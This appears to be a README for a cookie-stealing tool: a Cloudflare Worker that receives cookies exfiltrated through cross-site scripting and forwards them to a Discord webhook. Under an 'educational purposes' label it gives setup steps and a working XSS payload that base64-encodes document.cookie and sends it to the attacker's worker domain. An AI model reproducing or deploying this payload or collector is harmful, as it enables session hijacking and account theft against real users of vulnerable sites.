For educational 🧑‍🎓 purposes.

Cloudflare worker to get cookies via xss vulnerability.

Setup:

1. `npm install`
2. `npm run setup` and paste [Discord webhook url](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
3. `npm run deploy`
4. Inject xss code snippet like
```html
<img src="x" onerror="this.src='https://worker-domain/?cookie=' +btoa(document.cookie);this.removeAttribute('onerror');" />
```